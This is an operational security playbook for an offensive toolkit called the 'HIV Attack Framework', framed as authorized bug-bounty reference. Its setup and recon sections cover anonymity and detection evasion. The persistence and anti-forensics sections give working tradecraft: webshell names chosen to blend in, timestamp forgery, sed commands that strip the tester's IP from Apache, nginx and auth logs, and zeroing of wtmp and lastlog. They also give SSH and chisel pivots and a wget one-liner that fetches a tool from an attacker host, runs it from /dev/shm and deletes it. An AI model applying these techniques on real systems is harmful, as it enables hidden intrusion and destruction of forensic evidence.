# OPSEC Protocol — HIV Attack Framework

> Authorized security research and bug bounty reference. All procedures are for permissioned engagements only.

---

## 1. Pre-Engagement Setup

### 1.1 Network Isolation
```
[ ] VPN selected with no-log policy + kill switch enabled
[ ] VPN tunnel verified: curl ifconfig.me != real IP
[ ] DNS leak test: dnsleaktest.com — all resolvers must be inside VPN
[ ] WebRTC disabled: browser://flags or uBlock Origin settings
[ ] IPv6 disabled (leaks real ISP): `ip6tables -P OUTPUT DROP` or disable in NIC settings
[ ] Tor-over-VPN for high-sensitivity recon if needed
```

**VPN Config Checklist:**
- Protocol: WireGuard preferred (less fingerprint than OpenVPN)
- Kill switch: must drop all traffic on VPN disconnect
- DNS: use VPN provider's DNS, not system resolver
- Verify: `curl --max-time 5 https://ifconfig.me` should return VPN exit IP

### 1.2 Browser Profile
```
[ ] Fresh browser profile — zero cookies, zero history
[ ] User-Agent set to common target-region UA (check whatismybrowser.com for realistic strings)
[ ] Canvas fingerprint: install CanvasBlocker or use Firefox with resist.fingerprinting=true
[ ] Installed extensions: only Burp CA cert + FoxyProxy (nothing that phones home)
[ ] Accept-Language: match target locale
[ ] Timezone: match target server timezone
[ ] No autofill, no password manager sync
```

**Recommended UA strings (2026):**
```
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
```

### 1.3 Burp Suite Configuration
```
[ ] Upstream proxy: VPN exit (verify no direct connections)
[ ] Intercept off during mapping phase (reduce noise)
[ ] Scope set BEFORE any browsing — out-of-scope requests blocked
[ ] SSL pass-through for third-party CDNs (don't generate noise to Cloudflare/Akamai for non-target domains)
[ ] Logger++ installed for full request archive
[ ] Repeater: set fixed session token to avoid generating multiple session entries
[ ] Collaborator: use private instance or interactsh, not public Burp Collaborator
```

### 1.4 Tool Verification
```
[ ] All tools launched fresh (no stale auth tokens from prior engagement)
[ ] Tool versions pinned (no auto-update mid-engagement)
[ ] interactsh server: self-hosted or use `interactsh-client -server https://oast.pro`
[ ] Verify tools route through VPN: `curl -x socks5h://127.0.0.1:1080 https://ifconfig.me`
[ ] No cloud tools with persistent logs (avoid SaaS scanners)
[ ] Local wordlists only — no pulling SecLists mid-engagement
```

---

## 2. During Recon (Stage 1) — Minimize Footprint

### 2.1 What NOT to Do
- ❌ Do NOT run automated scanners (nikto, nuclei mass-scan) without rate limiting
- ❌ Do NOT enumerate non-scoped subdomains (generates noise in their SIEM)
- ❌ Do NOT crawl with default User-Agents (identifies tooling immediately)
- ❌ Do NOT use Google Dorking from same IP you test from (Google reports to target if enterprise)
- ❌ Do NOT trigger account lockout policies (max 3-5 failed auth attempts per account)
- ❌ Do NOT run port scans against infrastructure not explicitly in scope

### 2.2 Logs You Generate During Recon
| Log Source | What's Recorded | Persistence |
|---|---|---|
| Web server access log | IP, UA, URL, timestamp, status code | 30-90 days typical |
| WAF/CDN logs (Cloudflare) | IP, ASN, request headers, fingerprint | 72 hours default |
| Load balancer | Source IP, TLS fingerprint (JA3) | Varies |
| Application DB | Login attempts, search queries | Indefinite |
| DNS logs | All subdomain lookups from your resolver | ISP/VPN dependent |
| Email logs | Any SPF/DMARC lookups from your IP | SMTP server |

### 2.3 Minimization Techniques
```bash
# Rate limit all HTTP requests
# Burp: Intruder → Resource Pool → throttle to 1-2 req/sec

# Use passive recon before active
# Order: crt.sh → Shodan → VirusTotal → then active DNS

# DNS: use authoritative lookup not recursive (less noise)
dig @8.8.8.8 target.com ANY          # still hits Google's logs
dig @1.1.1.1 target.com MX           # Cloudflare logs

# Better: use DoH with VPN
curl -H "accept: application/dns-json" \
  "https://cloudflare-dns.com/dns-query?name=target.com&type=ANY"

# Spread recon over time — don't hit 100 subdomains in 10 seconds
# Use amass in passive mode:
amass enum -passive -d target.com -o recon_passive.txt
```

---

## 3. During Access (Stage 2) — Request Hygiene

### 3.1 Request Hygiene Rules
- Always include realistic headers: `Accept`, `Accept-Language`, `Referer`, `Cache-Control`
- Match cookie session values to avoid "session anomaly" alerts
- Preserve CSRF tokens — don't send stale tokens
- Match `Content-Type` exactly to what the app expects
- If app uses fingerprinting (PerimeterX, DataDome): simulate human timing between requests

### 3.2 Error Budget
| Error Type | Max Occurrences | Action at Limit |
|---|---|---|
| 401 Unauthorized | 5 per endpoint | Rotate credential / abort path |
| 403 Forbidden | 10 per session | Assume WAF triggered — pause 30min |
| 429 Rate Limited | 3 per session | Full stop — wait 1 hour |
| 500 Server Error | 3 | Stop testing that endpoint — flag for report |
| WAF block page | 2 | Rotate IP, rotate UA |

**Hard abort triggers:**
- Email/SMS alert received on test account → STOP, document, wait
- Login anomaly notification → session likely flagged
- CAPTCHA suddenly appearing on previously clean endpoints
- Response time spikes >10x baseline → IDS may be throttling

### 3.3 Timing Discipline
```python
# Human-like timing simulation
import time, random

def human_delay(min_s=1.0, max_s=4.0):
    """Simulate human think time between requests"""
    time.sleep(random.uniform(min_s, max_s))

# Between form submissions: 2-8 seconds
# Between page navigations: 1-3 seconds
# Between parameter fuzzing payloads: 0.5-2 seconds
# After auth events: 3-10 seconds (humans read the response)
```

---

## 4. During Persistence (Stage 4) — Camouflage Techniques

### 4.1 File Naming Camouflage
```bash
# Name webshells like legitimate framework files
# Bad (obvious): shell.php, cmd.php, webshell.php
# Good (blends in):
# WordPress context:
wp-login-backup.php
class-wp-list-table-compat.php
wp-cron-scheduler.php

# Laravel context:
ServiceProviderCompat.php
RouteCompilerHelper.php

# Django context:
middleware_compat.py
url_resolver_cache.py

# Generic:
health-check.php         # looks like monitoring
robots-validator.php     # looks like SEO tool
cache-warmer.php         # looks like CDN tool
```

### 4.2 Timestamp Manipulation
```bash
# Linux — set file timestamps to match surrounding files
touch -r /var/www/html/index.php /var/www/html/shell.php
# Sets shell.php timestamps to match index.php

# Set specific timestamp
touch -t 202301151030.00 /var/www/html/target.php
# Sets to 2023-01-15 10:30:00

# Preserve original timestamps when copying
cp --preserve=timestamps original.php modified.php

# Check what timestamps exist on directory to blend in
stat /var/www/html/*.php | grep -A2 "Modify:"

# Windows equivalent
$file = Get-Item "C:\inetpub\wwwroot\target.aspx"
$file.CreationTime = "01/15/2023 10:30:00"
$file.LastWriteTime = "01/15/2023 10:30:00"
$file.LastAccessTime = "01/15/2023 10:30:00"
```

### 4.3 Log Poisoning / Neutralization
```bash
# Apache — remove specific IP from access log
sed -i "/^YOUR_IP /d" /var/log/apache2/access.log
sed -i "/^YOUR_IP /d" /var/log/apache2/access.log.1

# Nginx
sed -i "/YOUR_IP/d" /var/log/nginx/access.log

# Auth log cleanup
sed -i "/YOUR_IP/d" /var/log/auth.log
sed -i "/Failed password.*YOUR_IP/d" /var/log/auth.log

# Bash history suppression (do at session start)
unset HISTFILE
export HISTSIZE=0
export HISTFILESIZE=0

# In-session history clear
history -c && history -w

# MySQL query log
SET GLOBAL general_log = 'OFF';
-- Or delete log file and recreate
FLUSH LOGS;

# Clear last login records
> /var/log/lastlog    # zero out
> /var/run/utmp
> /var/log/wtmp
```

---

## 5. During Lateral Movement (Stage 6) — Session Handoff

### 5.1 Session Handoff Procedure
```
1. Establish stable foothold on source host
2. Verify outbound connectivity from source: curl -s https://ifconfig.me
3. Set up SOCKS proxy through source host
4. Verify pivot: all traffic to next-hop routes through source
5. Confirm next-hop credentials / access before abandoning source shell
6. Keep source shell alive with keepalive (sleep loop or SSH keepalive)
7. Document path: attacker → pivot1 → target (for report chain)
```

```bash
# SSH pivot setup
ssh -D 1080 -N -f user@pivot_host        # SOCKS5 on localhost:1080
ssh -L 8080:internal-target:80 user@pivot  # Port forward

# Test pivot works
curl --socks5-hostname localhost:1080 http://internal-target/

# Chisel (HTTP tunnel through firewall)
# On pivot host:
./chisel server -p 8000 --reverse
# On attacker:
./chisel client pivot_host:8000 R:socks
```

### 5.2 Tool Rotation
| Phase | Primary Tool | Rotate To | Trigger |
|---|---|---|---|
| Web recon | Burp | Manual curl | After 429 or WAF block |
| Port scan | nmap | masscan then back to nmap | After IDS signature |
| Shell | bash | python pty | After detection attempt |
| File transfer | wget | curl then base64 pipe | After block on port 80/443 |
| DNS enum | amass | subfinder | After resolver block |

---

## 6. Anti-Forensics Reference

### 6.1 Artifacts Per Technique

| Technique | Artifacts Generated | Minimization |
|---|---|---|
| Web request fuzzing | WAF logs, server access logs, error logs | Rate limit, rotate UA, use out-of-band timing |
| File upload | Upload event logs, AV scan events, stored file | Use allowed extension, benign MIME header |
| RCE via command injection | Process tree, shell history, /proc entries | Use `exec()` not `system()`, clear history |
| SQLi | DB query logs, error logs, slow query log | Use blind/time-based (no errors), clean payloads |
| Credential access | Auth failure logs, MFA events | Limit attempts, use valid session reuse |
| Lateral movement | SSH logs, auth events, netflow | Route via allowed ports (443/80), use existing creds |
| Exfiltration | Netflow, DLP alerts, proxy logs | Chunk data, use HTTPS to legit-looking domains, steganography |

### 6.2 Memory Artifacts
```bash
# Minimize memory artifacts
# Use shell builtins where possible (no disk write for child process)
echo "test" vs cat file.txt  # echo is builtin, cat spawns process

# Avoid writing to /tmp
# Use /dev/shm (RAM-backed, no disk write)
cp tool /dev/shm/
chmod +x /dev/shm/tool
/dev/shm/tool

# Execute and delete immediately
wget -qO /dev/shm/t http://attacker/tool && chmod +x /dev/shm/t && /dev/shm/t; rm /dev/shm/t
```

---

## 7. Evidence Cleanup — Ordered Procedure

**Cleanup order matters. Always work backwards through the kill chain.**

```
Step 1: Remove persistence mechanisms
  - Delete webshells, cron jobs, startup entries
  - Remove added SSH keys (~/.ssh/authorized_keys)
  - Revert any config changes

Step 2: Remove uploaded/dropped files
  - Delete all uploaded files
  - Remove tools dropped during lateral movement
  - Check /tmp, /dev/shm, /var/tmp

Step 3: Clear shell history
  - history -c && history -w
  - rm ~/.bash_history
  - rm ~/.zsh_history

Step 4: Clear log entries (only if explicitly authorized — check ROE)
  - Remove IP from access logs
  - Clear auth log entries
  - Clear application-specific logs

Step 5: Restore modified files to original state
  - Restore config files (use backup you made pre-change)
  - Restore file permissions

Step 6: Close all connections
  - Kill tunnel processes
  - Close all shells in reverse order (furthest first)

Step 7: Verify cleanup
  - Re-check for artifacts: `find / -newer /tmp/start_marker 2>/dev/null`
  - Check for running processes
  - Review active network connections
```

---

## 8. Emergency Abort — Kill Switch Procedure

### 8.1 Detection Indicators
- Receiving unexpected 403/429 on previously working endpoints
- Response content changes without app deployment
- Account locked / password reset email received
- Unusual latency spikes (IDS inspection)
- Honeypot token triggered
- Blue team interaction (unexpected email/call)

### 8.2 Kill Switch Sequence
```
IMMEDIATE (within 30 seconds of detection):
1. Kill all active shells: `exit` or kill terminal
2. Disconnect VPN (kill switch fires, drops all traffic)
3. Close browser profile
4. Stop Burp Suite

SHORT-TERM (within 5 minutes):
5. Document current state: screenshot, timestamp, what was last done
6. Note all IPs, sessions, files touched
7. Do NOT attempt cleanup while possibly observed — it creates more evidence

DORMANCY (24-72 hours):
8. Rotate all IPs: new VPN exit, new proxy chain
9. Wait for detection noise to clear
10. If authorized: communicate with program triage team
```

### 8.3 Dormancy Protocol
```
- Do NOT re-test for minimum 48 hours after abort
- Switch to different VPN provider entirely
- Use new browser profile (delete all fingerprints)
- If re-engaging: use completely different attack path
- Document the abort event in engagement notes
```

---

## 9. Bug Bounty Specific OPSEC

### 9.1 Evidence TO Preserve (for report)
```
✅ Full HTTP request/response pairs (Burp Save Items)
✅ Screenshots of impact (account data, admin access, etc.)
✅ Video recording of PoC steps (OBS or Loom)
✅ Interactsh/Collaborator callback logs (proves OOB)
✅ Timestamps of all findings (UTC)
✅ Payload that triggered the vulnerability (exact string)
✅ Scope reference (which asset, which program rule applies)
```

### 9.2 What NOT to Generate
```
❌ Do NOT access other users' real PII (use test accounts)
❌ Do NOT exfiltrate real data (capture headers/DB name only, not rows)
❌ Do NOT test on production if staging is available
❌ Do NOT automate attacks that generate high volume (DoS risk)
❌ Do NOT test out-of-scope subdomains even if you find vulns
❌ Do NOT share findings publicly before disclosure window
❌ Do NOT use public Burp Collaborator for sensitive OOB (logs are visible to PortSwigger)
```

### 9.3 Scope Creep Prevention
```bash
# Burp scope regex — only test what's in scope
# Target → Scope → Use advanced scope control
# Include: ^https?://[^/]*\.target\.com/
# Exclude: ^https?://cdn\.target\.com/
#          ^https?://status\.target\.com/

# If you accidentally hit out-of-scope:
# 1. Stop immediately
# 2. Document what happened (timestamps, request)
# 3. Report to program as unintended access
# 4. Do NOT continue testing that asset
```

---

*Last reviewed: HIV Framework v2.0 | Context: Authorized research only*
